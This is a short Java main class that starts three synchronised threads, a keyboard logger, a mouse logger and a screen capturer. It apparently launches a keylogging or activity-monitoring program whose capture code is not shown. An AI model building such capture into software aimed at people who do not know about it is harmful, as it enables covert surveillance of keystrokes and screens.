package app;

public class App {
    
   public static void main(String[] args) throws Exception 
   {
       //Syncing Object to sync all three threads.
        Sync sync = new Sync();

        //Start All Three Threads alongside the sync object as a parameter
        Keyboard keyboardLogger = new Keyboard("Keyboard", sync);
        Mouse mouseLogger = new Mouse("Mouse", sync);
        Screen screenCapture = new Screen("Screen", sync);
        keyboardLogger.start();
        mouseLogger.start();
        screenCapture.start();
    }
}